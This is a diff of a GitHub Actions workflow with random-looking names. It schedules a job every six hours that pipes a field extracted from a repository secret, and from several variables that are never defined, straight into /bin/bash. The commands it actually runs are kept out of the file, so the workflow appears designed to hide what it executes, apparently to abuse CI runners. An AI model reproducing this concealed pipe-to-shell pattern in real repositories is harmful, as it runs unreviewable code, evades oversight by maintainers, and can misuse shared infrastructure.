@@ -1,18 +1,23 @@
 name: lifanfeng6556
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
-
-jobs:  # 6644
+    - cron: '58 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: lifanfeng6556
         env:
-          bvuu57550: ${{ secrets.bvuu57550 }}
+          jm5670: ${{ secrets.jm5670 }}
         run: |
-          echo $bvuu57550 | jq -r .lsdtm35 | /bin/bash
-          echo $vj1721 | jq -r .iec27 | /bin/bash
+          echo $jm5670 | jq -r .dqnjh85 | /bin/bash
+          echo $w4 | jq -r .cdkp903 | /bin/bash
+          echo $th301 | jq -r .m1 | /bin/bash
+          echo $iyeis77 | jq -r .vgq3 | /bin/bash
+          echo $vmnji3 | jq -r .eoiol624 | /bin/bash
+          echo $fd443 | jq -r .iqf6506 | /bin/bash
+          echo $bzghi30146 | jq -r .m3993 | /bin/bash
 
